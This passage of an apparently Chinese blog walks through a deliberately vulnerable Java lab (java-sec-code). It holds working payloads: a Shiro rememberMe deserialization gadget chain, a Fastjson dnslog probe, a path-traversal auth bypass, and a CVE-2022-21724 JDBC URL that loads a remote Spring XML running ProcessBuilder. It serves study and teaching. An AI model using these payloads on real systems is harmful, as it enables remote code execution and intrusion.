class="hljs-keyword">ls</span>LkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dG<span class="hljs-keyword">ls</span>L01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dG<span class="hljs-keyword">ls</span>Lkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br></code></pre></td></tr></table></figure><p>之后在 cookie 中加入payload：</p><p><strong>注意： rememberMe &#x3D; &lt;payload&gt;</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934983.png" alt="20250724132100840"></p><p>发包后会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934545.png" alt="20250724132234120"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934976.png" alt="20250724132330738"></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>触发点:  JSON.parseObject()      JSON.parse()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934865.png" alt="20250724134123264"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String params)</span> &#123;<br>        <span class="hljs-comment">// 如果Content-Type不设置application/json格式，post数据会被url编码</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 将post提交的string转换为json</span><br>            <span class="hljs-comment">//Fastjson 框架将字符串解析为 JSONObject 对象</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">ob</span> <span class="hljs-operator">=</span> JSON.parseObject(params);<br>            <span class="hljs-keyword">return</span> ob.get(<span class="hljs-string">&quot;name&quot;</span>).toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>post 请求 &#x2F;fastjson&#x2F;deserialize ，传输 <strong>application&#x2F;json</strong> 格式数据</p><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;2jf0vy.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935795.png" alt="20250724135345425"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935897.png" alt="20250724135353947"></p><h2 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/file&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload</span> &#123;<br><br>    <span class="hljs-comment">// Save the uploaded file to this folder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">UPLOADED_FOLDER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">randomFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// uplaod any file</span><br>    <span class="hljs-meta">@GetMapping(&quot;/any&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// return upload.html page</span><br>    &#125;<br><br>    <span class="hljs-comment">// only allow to upload pictures</span><br>    <span class="hljs-meta">@GetMapping(&quot;/pic&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadPic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;uploadPic&quot;</span>; <span class="hljs-comment">// return uploadPic.html page</span><br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">singleFileUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span><br><span class="hljs-params">                                   RedirectAttributes redirectAttributes)</span> &#123;<br>        <span class="hljs-keyword">if</span> (file.isEmpty()) &#123;<br>            <span class="hljs-comment">// 赋值给uploadStatus.html里的动态参数message</span><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please select a file to upload&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Get the file and save it somewhere</span><br>            <span class="hljs-type">byte</span>[] bytes = file.getBytes();<br>            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());<br>            Files.write(path, bytes);<br><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>,<br>                    <span class="hljs-string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;upload failed&quot;</span>);<br>            logger.error(e.toString());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>未对文件名、后缀名进行过滤，直接上传文件。</p><p><strong>漏洞利用：</strong></p><p>功能点：<a href="http://127.0.0.1:8081/file/any">http://127.0.0.1:8081/file/any</a> ，可以上传任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935394.png" alt="20250724141442245"></p><h2 id="GetRequestURI"><a href="#GetRequestURI" class="headerlink" title="GetRequestURI"></a>GetRequestURI</h2><blockquote><p>request.getRequestURL() 返回全路径</p><p>request.getRequestURI() 返回除去host（域名或者ip）部分的路径</p><p>request.getContextPath() 返回工程名部分，如果工程映射为&#x2F;，此处返回则为空</p><p>request.getServletPath() 返回除去host和工程名部分的路径</p><p>例如：</p><p>request.getRequestURL() <a href="http://localhost:8080/jqueryLearn/resources/request.jsp">http://localhost:8080/jqueryLearn/resources/request.jsp</a><br>request.getRequestURI() &#x2F;jqueryLearn&#x2F;resources&#x2F;request.jsp<br>request.getContextPath()&#x2F;jqueryLearn<br>request.getServletPath()&#x2F;resources&#x2F;request.jsp </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;uri&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetRequestURI</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/exclued/vuln&quot;)</span><br>    <span class="hljs-comment">//方法接收 HttpServletRequest 用于获取当前请求的 URI、路径等信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exclued</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-comment">//若请求路径匹配 /css/** 和 /js/** 路径，就跳过登录</span><br>        String[] excluedPath = &#123;<span class="hljs-string">&quot;/css/**&quot;</span>, <span class="hljs-string">&quot;/js/**&quot;</span>&#125;;<br>        <span class="hljs-comment">//获取请求 URI</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI(); <span class="hljs-comment">// Security: request.getServletPath()</span><br>        <span class="hljs-type">PathMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathMatcher</span>();<br><br>        <span class="hljs-comment">//打印 getRequestURI() 和 getServletPath() 的结果</span><br>        logger.info(<span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri);<br>        logger.info(<span class="hljs-string">&quot;getServletPath: &quot;</span> + request.getServletPath());<br><br>        <span class="hljs-comment">//遍历所有排除规则，如果当前请求 URI 匹配任意规则，则认为绕过登录校验</span><br>        <span class="hljs-keyword">for</span> (String path : excluedPath) &#123;<br>            <span class="hljs-keyword">if</span> (matcher.match(path, uri)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You have bypassed the login page.&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果请求路径不匹配排除规则，则返回提示页面是登录页。</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is a login page &gt;..&lt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个奇怪的点：<code>@RequestMapping(&quot;uri&quot;)</code></p><p>注释中都没有加 <code>uri</code> ，如果不加 <code>uri</code> 下面的全部访问不到，但是 <code>getRequestURI() 返回除去 host（域名或者ip）部分的路径</code> 一定会包含  <code>uri</code> ，这就导致 <code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code> 完全起不到作用，因为 <code>getRequestURI() </code>返回为 <code>/uri/...</code>，导致匹配不到 <code>&quot;/css/**&quot;, &quot;/js/**&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935768.png" alt="20250724151631951"></p><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/testPath&quot;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testPath</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>       <span class="hljs-comment">// 返回当前请求的完整路径 和 servletPath</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">servletPath</span> <span class="hljs-operator">=</span> request.getServletPath();<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri + <span class="hljs-string">&quot;\ngetServletPath: &quot;</span> + servletPath;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935368.png" alt="20250724152429560"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936550.png" alt="20250724152503479"></p><p>想要利用就改一下匹配规则：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span>[] excluedPath = &#123;<span class="hljs-string">&quot;/uri/css/**&quot;</span>, <span class="hljs-string">&quot;/uri/js/**&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936819.png" alt="20250724152945636"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">poc:</span><br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span><span class="hljs-keyword">/exclued/</span>vuln<br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span>bypasswaf<span class="hljs-keyword">/exclued/</span>vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936089.png" alt="20250724153028787"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936309.png" alt="20250724153553391"></p><h2 id="jdbc-CVE-2022-21724"><a href="#jdbc-CVE-2022-21724" class="headerlink" title="jdbc-CVE 2022 21724"></a>jdbc-CVE 2022 21724</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936646.png" alt="20250725111517628"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/jdbc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &lt;a href=&quot;https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724&quot;&gt;CVE-2022-21724&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/postgresql&quot;)</span><br>    <span class="hljs-comment">//接收 Base64 编码的 jdbcurl ，</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postgresql</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/db2&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">db2</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PostgreSQL JDBC 驱动支持通过 JDBC URL 中的参数 <code>socketFactory</code> 指定自定义类，用于创建 socket 连接。</p><p><strong>在漏洞版本中，这个类没有限制来源</strong>，攻击者可通过如下 URL 参数让其加载任意类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socketFactory=<span class="hljs-tag">&lt;<span class="hljs-name">任意类</span>&gt;</span>&amp;socketFactoryArg=<span class="hljs-tag">&lt;<span class="hljs-name">任意参数</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Spring 环境中存在的 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 是一个典型的入口点，它可自动解析并执行外部 XML 配置。</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==<br><br>jdbc:postgresql:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5432</span><span class="hljs-regexp">/test/</span>?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>test.joychou.org/<span class="hljs-number">1</span>.xml<br></code></pre></td></tr></table></figure><p><strong>socketFactory</strong> &#x3D; 使用了 Spring 的 <code>ClassPathXmlApplicationContext</code> 类</p><ul><li>该类在初始化时会加载并解析指定 URL 或文件的 Spring XML 配置。</li></ul><p><strong>socketFactoryArg</strong> &#x3D; 远程的 <code>1.xml</code></p><ul><li>这个 XML 是 Spring Bean 配置文件，包含了一个 <strong>ProcessBuilder</strong> Bean，启动本地程序。</li></ul><p>1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-comment">&lt;!-- mac 中运行计算机；Linux 就是 /bin/sh，Windows 就是 cmd.exe--&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><blockquote><p>JSONP（JSON with Padding）是浏览器早期为了解决<strong>跨域请求数据</strong>的一种方法。它的基本原理是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/jsonp?callback=handleResponse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>服务器返回的不是 JSON，而是：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;<span class="hljs-function"><span class="hljs-title">handleResponse</span>(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;);</span><br></code></pre></td></tr></table></figure><p>如果服务器不严格校验 <code>callback</code> 参数来源，就可能造成 <strong>跨站数据泄露（XSS）</strong> 或 <strong>信息泄露漏洞</strong>。</p></blockquote><p><strong>漏洞利用：</strong></p><p>搜关键字：<code>AbstractJsonpResponseBodyAdvice</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Object2Jsonp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJsonpResponseBodyAdvice</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] callbacks;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Logger logger= LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br><br>    <span class="hljs-comment">// method of using @Value in constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Object2Jsonp</span><span class="hljs-params">(<span class="hljs-meta">@Value(&quot;$&#123;joychou.security.jsonp.callback&#125;&quot;)</span> String[] callbacks)</span> &#123;<br>        <span class="hljs-built_in">super</span>(callbacks);  <span class="hljs-comment">// Can set multiple paramNames</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbac<br></code></pre></td></tr></table></figure><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>版本存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938586.png" alt="20250725135906016"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@RequestMapping(value = &quot;/log4j&quot;)</span><br><span 